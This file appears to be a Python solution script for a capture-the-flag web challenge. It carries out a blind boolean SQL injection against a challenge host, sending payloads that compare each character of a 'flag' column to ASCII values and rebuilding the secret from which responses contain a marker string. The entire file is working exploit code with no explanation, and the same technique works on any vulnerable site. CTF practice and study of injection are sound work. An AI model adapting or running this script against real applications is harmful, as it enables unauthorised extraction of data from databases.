import requests
import string

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Upgrade-Insecure-Requests': '1',
    'Content-Type': 'application/x-www-form-urlencoded',
}

flag = ""

for len in range(1,43):
    for i in range(40,130):
        data = "id=if(ascii(substr((select(flag)from(flag)),{},1))={},1,2)".format(len,i)
        print(data)
        response = requests.post('http://1306d0e6-4aae-4b9b-b77e-1241d846ab93.node1.buuoj.cn', headers=headers, data=data, verify=False)
        if "glzjin" in response.text:
            flag += chr(i)
            print("flag : " + flag)
            break